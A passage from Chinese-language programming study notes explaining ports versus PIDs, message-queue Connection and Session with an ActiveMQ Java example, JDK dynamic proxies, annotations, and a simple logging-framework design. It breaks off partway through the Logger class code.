<li>内核维护一个“端口号到套接字（socket）”的映射关系，而不是“端口号到 PID”的关系。</li>
<li>即使你知道 PID，在网络通信过程中也无法利用它路由数据。</li>
</ul>
<h3 id="✅-3-PID-是动态的、本地的，而端口号是可绑定的、可配置的">✅ 3. <strong>PID 是动态的、本地的，而端口号是可绑定的、可配置的</strong></h3>
<ul>
<li>一个进程挂掉再重启，PID 可能变化。</li>
<li>但如果它重新绑定同一个端口号，客户端依然可以找到它。</li>
<li>所以服务进程通常绑定固定端口，比如 web 服务器默认监听 80 端口。</li>
</ul>
<h3 id="✅-4-应用层通过-socket-使用端口号，不涉及-PID">✅ 4. <strong>应用层通过 socket 使用端口号，不涉及 PID</strong></h3>
<ul>
<li>在 TCP/UDP 编程中，应用程序用 <code>socket.bind(ip, port)</code> 明确绑定端口。</li>
<li>无需、也不能指定或感知 PID。</li>
</ul>
<h3 id="🔍-举个简单例子：">🔍 举个简单例子：</h3>
<p>假设你电脑上的浏览器进程 PID 是 1234，访问百度服务器：</p>
<ul>
<li>浏览器进程会自动使用一个临时端口（如 51515），向百度的 443 端口发起请求。</li>
<li>百度服务器根本不知道你进程号是多少，它只看到你的 IP 和端口（如 <code>192.168.1.2:51515</code>）。</li>
</ul>
<h3 id="✅-总结一句话：">✅ 总结一句话：</h3>
<blockquote>
<p><strong>端口号是网络通信协议中公开、标准的地址接口，而进程号是操作系统私有的调度标识。网络通信必须使用端口号才能建立跨主机的连接。</strong></p>
</blockquote>
<h1>Connection和Session</h1>
<p>消息队列（如 RocketMQ、ActiveMQ、Kafka 等）中的 <code>Connection</code> 和 <code>Session</code>：</p>
<h2 id="🧩-一、什么是-Connection？">🧩 一、什么是 Connection？</h2>
<p><strong>Connection（连接）是你与消息服务器之间的一条“通信通道”。</strong></p>
<p>就像你用微信聊天，必须先连上互联网一样，在消息中间件中，<strong>你必须先建立连接，才能跟消息服务器（Broker）打交道。</strong></p>
<h3 id="✅-特点：">✅ 特点：</h3>
<ul>
<li>通常是一个<strong>长连接</strong>（TCP 连接），持续存在。</li>
<li>一个连接代表一个客户端与 Broker 的连接。</li>
<li>创建连接通常是比较“重”的操作，成本高，数量不宜过多。</li>
<li>可以<strong>复用连接</strong>，在一条连接上创建多个会话。</li>
</ul>
<h2 id="🧩-二、什么是-Session？">🧩 二、什么是 Session？</h2>
<p><strong>Session（会话）是在 Connection 中创建的消息处理上下文，是实际干活的“工作单元”。</strong></p>
<h3 id="✅-特点：-2">✅ 特点：</h3>
<ul>
<li><strong>轻量级</strong>，每个连接可以创建多个 Session。</li>
<li>你所有的<strong>发消息、收消息、消息确认、事务控制</strong>都在 Session 中进行。</li>
<li>可以控制是否使用<strong>事务模式（transacted）</strong>，以及<strong>消息确认模式（acknowledge mode）</strong>。</li>
<li>Session 内的操作是<strong>顺序执行的</strong>，线程不安全，通常每个线程使用自己的 Session。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTVkOTU2NGNkZjgxODkyMTZlN2ZmZmRkZDc2NWVmYWJfSFVCcEIzdmJJSW4wYnJKRDJneU1DZHphTUZUQnZwbUtfVG9rZW46VHNvTGI3enJnb29oRXR4WDk1QmMySzNObk1iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleProducer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">        <span class="comment">// 1. 创建连接工厂（参数是 Broker 地址）</span></span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 创建 Connection（连接到消息服务器）</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start(); <span class="comment">// 启动连接（开启电话线）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建 Session（建立会话，准备发消息）</span></span><br><span class="line">        <span class="comment">// 参数1：是否启用事务，参数2：消息确认模式</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 创建目的地（可以是队列 Queue 或主题 Topic）</span></span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;demo-queue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 创建消息生产者</span></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        producer.setDeliveryMode(DeliveryMode.PERSISTENT); <span class="comment">// 设置持久化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 创建消息</span></span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createTextMessage(<span class="string">&quot;Hello, MQ World!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 发送消息</span></span><br><span class="line">        producer.send(message);</span><br><span class="line">        System.out.println(<span class="string">&quot;消息已发送： &quot;</span> + message.getText());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 关闭资源</span></span><br><span class="line">        producer.close();</span><br><span class="line">        session.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2VhOTI5YzkyYmIzYTMxMjM3YTYwOGJlNTY1MTc5YmFfMGlwSTI2eE9veUY4RHM4b0FYc2JnMTNMRFdnVnhBNUNfVG9rZW46SEpRV2JQS3Fkb1RCdm94aDFVOGMyOUhibmJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>动态代理机制</h1>
<h2 id="🧩-1-场景概览：动态代理做了什么？">🧩 1. 场景概览：动态代理做了什么？</h2>
<p>简单来说：</p>
<blockquote>
<p><strong>你并没有直接调用目标对象的</strong> <strong><code>sayHello()</code></strong> <strong>方法，而是通过一个代理对象调用的，这个代理对象在方法前后插入了日志逻辑。</strong></p>
</blockquote>
<p>图示结构：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用者 --&gt; 代理对象 <span class="function"><span class="params">($HelloWorld100)</span> --&gt;</span> LoggerHandler --&gt; 真正方法 sayHello()</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2ExYmMwYWJiOGE5ZDVhOTZkOGE2NGNkYmI4MGMyOGFfcDJMNm82Q2pkaXNsRXhKZng3eWtCUWlqRjBXTExzeUdfVG9rZW46UGRMaWJTSUdubzE2Y1R4ZjZTTGNRODVGblBiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🧠-总结原理图">🧠 总结原理图</h3>
<p>proxy.sayHello()  --&gt;  LoggerHandler.invoke()</p>
<p>​                       |–&gt; Logger.startLog()</p>
<p>​                       |–&gt; 真正调用 target.sayHello()</p>
<p>​                       |–&gt; Logger.endLog()</p>
<blockquote>
<h4 id="为什么就走LoggerHandler-的-invoke-方法了">为什么就走LoggerHandler 的 invoke 方法了</h4>
</blockquote>
<p>这个问题非常关键！<strong>为什么调用</strong> <strong><code>proxy.sayHello()</code>****，最终会执行</strong> <strong><code>LoggerHandler</code></strong> <strong>的</strong> <strong><code>invoke()</code></strong> <strong>方法？</strong> 本质上，这是因为 <strong>JDK 动态代理机制</strong>在底层生成的代理类中，<strong>拦截了所有接口方法调用，并把它们转发给了你传入的</strong> <strong><code>InvocationHandler</code></strong> <strong>的</strong> <strong><code>invoke()</code></strong> <strong>方法。</strong></p>
<h2 id="✅-一句话解释：-2">✅ 一句话解释：</h2>
<blockquote>
<p><strong>JDK Proxy 生成的代理对象并不包含真正的逻辑，而是统一把所有方法调用“拦截”后，调用你传入的</strong> <strong><code>LoggerHandler.invoke(proxy, method, args)</code>****。</strong></p>
</blockquote>
<h2 id="🧩-举个真实例子（反编译后你会看到的结构）：">🧩 举个真实例子（反编译后你会看到的结构）：</h2>
<p>你代码里是：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy<span class="selector-class">.sayHello</span>(); <span class="comment">// 表面看是调用 sayHello()</span></span><br></pre></td></tr></table></figure>
<p>实际上这个 <code>proxy</code> 是代理类，比如 <code>$Proxy1</code>，它的 <code>sayHello()</code> 源码大致如下：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span>()</span> &#123;Method m = IHelloWorld.<span class="keyword">class</span>.getMethod(<span class="string">&quot;sayHello&quot;</span>); ``    handler.invoke(<span class="keyword">this</span>, m, <span class="literal">null</span>); <span class="comment">// 直接转发给 InvocationHandler` `&#125;</span></span><br></pre></td></tr></table></figure>
<p>也就是说：</p>
<ul>
<li><strong>你以为是在执行</strong> <strong><code>sayHello()</code></strong></li>
<li><strong>其实这个方法被动态生成为转发逻辑，它什么都不干，只是“通知” InvocationHandler</strong></li>
</ul>
<h2 id="🔍-为什么代理对象可以这样做？">🔍 为什么代理对象可以这样做？</h2>
<p>因为你是这样创建它的：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IHelloWorld proxy = (IHelloWorld) Proxy.newProxyInstance( ``    target.getClass().getClassLoader(), ``    target.getClass().getInterfaces(), // 代理接口！ ``    <span class="keyword">new</span> LoggerHandler(target)          // 调用逻辑交给你传的 Handler` `)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>这个过程：</p>
<ol>
<li>Java 生成了一个新的类 <code>$Proxy123</code>，它 <strong>实现了</strong> <strong><code>IHelloWorld</code></strong> <strong>接口</strong>；</li>
<li>它的所有方法（比如 <code>sayHello()</code>）<strong>都不做任何事，而是转发到</strong> <strong><code>LoggerHandler.invoke()</code>****；</strong></li>
<li>所以你调用 <code>proxy.sayHello()</code>，最终一定会触发 <code>invoke(proxy, method, args)</code>；</li>
</ol>
<h2 id="📦-JVM-层的底层原理图：">📦 JVM 层的底层原理图：</h2>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你写的代码： <span class="string">``</span>    proxy.<span class="title function_">sayHello</span>();</span><br><span class="line"> <span class="string">``</span><span class="variable constant_">JDK</span> <span class="title class_">Proxy</span> 生成的代码： <span class="string">``</span>    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">sayHello</span>(<span class="params"></span>) &#123; <span class="string">``</span>        handler.<span class="title function_">invoke</span>(<span class="variable language_">this</span>, sayHello方法对象, 参数); <span class="string">``</span>    &#125;</span><br><span class="line"> <span class="string">``</span>你的 <span class="title class_">Handler</span>： <span class="string">``</span>    <span class="keyword">public</span> <span class="title class_">Object</span> <span class="title function_">invoke</span>(<span class="params">...</span>) &#123; <span class="string">``</span>        <span class="title class_">Logger</span>.<span class="title function_">startLog</span>(); <span class="string">``</span>        method.<span class="title function_">invoke</span>(target, args); <span class="string">``</span>        <span class="title class_">Logger</span>.<span class="title function_">endLog</span>(); <span class="string">``</span>    &#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTNjYTY1MWQ0NDZkODM5YTAxZGM1ODIxN2RhY2M2YWFfdEJDZTdjTUZYV0Y2azNDbnVhMmVTUklUd3E5aTlOcmFfVG9rZW46RGMwU2JuUG1Ob1JEem94Vkc0SmNDQXF4bnlmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>注解</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmYxNGQ2ZjhjY2IwYTdlYWY4NjI4Y2ZhNTBkZWRjNjVfdlJQRDh1cmdlampWaThWc3NMUHVSWjZvR2pXMVhVZFdfVG9rZW46RFV4ZmJUVnNlbzluMEN4MXBkamNKYVp6bnFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>✅ <strong>“注解是元数据（metadata）——它只是附着在代码上的说明性信息。”</strong> ✅ “谁来用它、怎么用它，是编译器、框架或运行时工具的事。</p>
<h1>日志系统</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTE2OTM5NmRmZGExY2EwZTQ5OWQ0ZDI5MWFmMDVjMzJfT0kxOE1jbENMSnhCcE1hdjJVOVphUjRBd3h0U21WWk9fVG9rZW46SjdmbWJLQzk1b3M5bW14eG5MV2MySW9SbnFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="一、五个关键类-接口详解">一、五个关键类/接口详解</h3>
<h4 id="1-LoggerEvent">1. <code>LoggerEvent</code></h4>
<ul>
<li><strong>作用</strong>：表示一次日志事件，封装了日志产生时的所有关键信息。</li>
<li><strong>通常包含字段</strong>：
<ul>
<li>日志时间戳</li>
<li>日志等级（Priority）</li>
<li>日志消息内容</li>
<li>所属 Logger 名称</li>
<li>线程信息等</li>
</ul>
</li>
<li><strong>使用场景</strong>：Logger 生成一个日志时会创建一个 <code>LoggerEvent</code> 对象，然后传递给 <code>Appender</code> 处理。</li>
</ul>
<h4 id="2-Logger">2. <code>Logger</code></h4>
<ul>
<li><strong>作用</strong>：日志记录器，是用户调用的核心类。</li>
<li><strong>功能</strong>：
<ul>
<li>负责接收日志请求（如 <code>info()</code>, <code>error()</code> 等）</li>
<li>按级别判断是否记录日志</li>
<li>创建 <code>LoggerEvent</code></li>
<li>把日志事件传递给附属的 <code>Appender</code></li>
</ul>
</li>
<li><strong>特点</strong>：一个应用中通常会有多个 Logger，每个 Logger 可能有自己的配置。</li>
</ul>
<h4 id="3-Appender">3. <code>Appender</code></h4>
<ul>
<li><strong>作用</strong>：日志输出器，决定日志记录输出到哪里。</li>
<li><strong>常见实现</strong>：
<ul>
<li>控制台输出（ConsoleAppender）</li>
<li>文件输出（FileAppender）</li>
<li>数据库、Socket、Kafka 等</li>
</ul>
</li>
<li><strong>正交性体现</strong>：你可以任意添加、替换或扩展 <code>Appender</code>，而不影响 Logger、Formatter。</li>
</ul>
<h4 id="4-Formatter">4. <code>Formatter</code></h4>
<ul>
<li><strong>作用</strong>：负责把 <code>LoggerEvent</code> 格式化成字符串。</li>
<li><strong>常见格式</strong>：
<ul>
<li>时间 + 日志等级 + 消息内容</li>
<li>JSON 格式等</li>
</ul>
</li>
<li><strong>正交性体现</strong>：你可以自由更换日志格式，而不会影响 Logger 或 Appender。</li>
</ul>
<h4 id="5-Priority（或称-LogLevel）">5. <code>Priority</code>（或称 <code>LogLevel</code>）</h4>
<ul>
<li><strong>作用</strong>：定义日志的严重级别。</li>
<li><strong>常见级别</strong>：<code>DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL</code></li>
<li><strong>用途</strong>：Logger 使用 Priority 判断是否需要处理某条日志。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">🧩 二、每个类的定义</span><br><span class="line"><span class="number">1.</span> <span class="title class_">Priority</span>（日志等级）</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Priority</span> &#123;</span><br><span class="line">    <span class="variable constant_">DEBUG</span>, <span class="variable constant_">INFO</span>, <span class="variable constant_">WARN</span>, <span class="variable constant_">ERROR</span>, <span class="variable constant_">FATAL</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> <span class="title class_">LoggerEvent</span>（日志事件）</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Date</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggerEvent</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Date</span> timestamp;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Priority</span> level;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">String</span> message;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">String</span> loggerName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">LoggerEvent</span>(<span class="title class_">String</span> loggerName, <span class="title class_">Priority</span> level, <span class="title class_">String</span> message) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">timestamp</span> = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">loggerName</span> = loggerName;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">level</span> = level;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">message</span> = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getter methods...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">Date</span> <span class="title function_">getTimestamp</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> timestamp; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">Priority</span> <span class="title function_">getLevel</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> level; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">getMessage</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> message; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">getLoggerName</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> loggerName; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> <span class="title class_">Formatter</span> 接口与实现类</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Formatter</span> &#123;</span><br><span class="line">    <span class="title class_">String</span> <span class="title function_">format</span>(<span class="title class_">LoggerEvent</span> event);</span><br><span class="line">&#125;</span><br><span class="line">实现一：简单文本格式化器</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFormatter</span> <span class="keyword">implements</span> <span class="title class_">Formatter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">format</span>(<span class="params"><span class="title class_">LoggerEvent</span> event</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">format</span>(<span class="string">&quot;[%s] [%s] [%s] - %s&quot;</span>,</span><br><span class="line">                event.<span class="title function_">getTimestamp</span>(), event.<span class="title function_">getLevel</span>(),</span><br><span class="line">                event.<span class="title function_">getLoggerName</span>(), event.<span class="title function_">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">实现二：<span class="title class_">JSON</span> 格式化器（示意）</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonFormatter</span> <span class="keyword">implements</span> <span class="title class_">Formatter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">format</span>(<span class="params"><span class="title class_">LoggerEvent</span> event</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">format</span>(<span class="string">&quot;&#123;\&quot;time\&quot;:\&quot;%s\&quot;, \&quot;level\&quot;:\&quot;%s\&quot;, \&quot;logger\&quot;:\&quot;%s\&quot;, \&quot;msg\&quot;:\&quot;%s\&quot;&#125;&quot;</span>,</span><br><span class="line">                event.<span class="title function_">getTimestamp</span>(), event.<span class="title function_">getLevel</span>(),</span><br><span class="line">                event.<span class="title function_">getLoggerName</span>(), event.<span class="title function_">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> <span class="title class_">Appender</span> 接口与实现类</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Appender</span> &#123;</span><br><span class="line">    <span class="built_in">void</span> <span class="title function_">append</span>(<span class="title class_">LoggerEvent</span> event);</span><br><span class="line">&#125;</span><br><span class="line">实现一：控制台输出</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsoleAppender</span> <span class="keyword">implements</span> <span class="title class_">Appender</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Formatter</span> formatter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ConsoleAppender</span>(<span class="title class_">Formatter</span> formatter) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">formatter</span> = formatter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">append</span>(<span class="params"><span class="title class_">LoggerEvent</span> event</span>) &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(formatter.<span class="title function_">format</span>(event));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">实现二：文件输出（简化示意）</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">FileWriter</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileAppender</span> <span class="keyword">implements</span> <span class="title class_">Appender</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Formatter</span> formatter;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">String</span> filePath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">FileAppender</span>(<span class="title class_">String</span> filePath, <span class="title class_">Formatter</span> formatter) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">formatter</span> = formatter;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">filePath</span> = filePath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">append</span>(<span class="params"><span class="title class_">LoggerEvent</span> event</span>) &#123;</span><br><span class="line">        <span class="title function_">try</span> (<span class="title class_">FileWriter</span> writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(filePath, <span class="literal">true</span>)) &#123;</span><br><span class="line">            writer.<span class="title function_">write</span>(formatter.<span class="title function_">format</span>(event) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">IOException</span> e) &#123;</span><br><span class="line">            e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> <span class="title class_">Logger</span> 类</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">ArrayList</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">List</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Logger</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">Priority</span> level;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">List</span>&lt;<span class="title class_">Appender</span>&gt; appenders = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">Logger</span>(<span class="title class_">String</span> name, <span class="title class_">Priority</span> level) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">level</span> = level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title 